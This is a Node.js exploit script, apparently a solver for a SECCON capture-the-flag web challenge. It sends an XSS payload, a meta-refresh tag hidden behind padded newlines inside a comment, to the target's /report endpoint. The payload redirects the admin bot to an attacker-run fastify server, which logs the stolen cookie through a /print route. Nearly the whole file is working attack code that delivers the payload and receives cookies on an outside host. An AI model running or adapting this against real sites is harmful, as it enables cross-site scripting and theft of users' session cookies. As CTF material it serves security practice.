const fastify = require("fastify")();
const fs = require("node:fs").promises;

const fail = (message) => {
  console.error(message);
  return process.exit(1);
};

const SECCON_BASE_URL =
  process.env.SECCON_BASE_URL ?? fail("No SECCON_BASE_URL");
const ATTACK_BASE_URL =
  process.env.ATTACK_BASE_URL ?? fail("No ATTACK_BASE_URL");
const LISTEN_PORT = process.env.PORT ?? "8080";

if (!ATTACK_BASE_URL.startsWith("http://")) {
  fail("Invalid ATTACK_BASE_URL: the CSRF will fail");
}

const sleep = (msec) => new Promise((resolve) => setTimeout(resolve, msec));

const exploit = async () => {
  const xss = `<meta http-equiv="Refresh" content="0; URL=${ATTACK_BASE_URL}">`;
  const code = `/*!${"\n".repeat(xss.length + 3)}${xss}*/\n`;

  const res = await (
    await fetch(`${SECCON_BASE_URL}/report`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        code,
      }),
    })
  ).text();
  console.log(res); // "Received :)"
};

const start = async () => {
  fastify.get("/", async (req, reply) => {
    const html = await fs.readFile("index.html");
    return reply.type("text/html; charset=utf-8").send(html);
  });

  fastify.get("/print", async (req, reply) => {
    console.log(req.query.cookie); // Print a flag

    process.exit(0);
  });

  fastify.listen(
    { port: LISTEN_PORT, host: "0.0.0.0" },
    async (err, address) => {
      if (err) {
        fastify.log.error(err);
        process.exit(1);
      }

      await sleep(2 * 1000);
      await exploit();

      await sleep(10 * 1000);
      fail("Failed");
    }
  );
};
start();
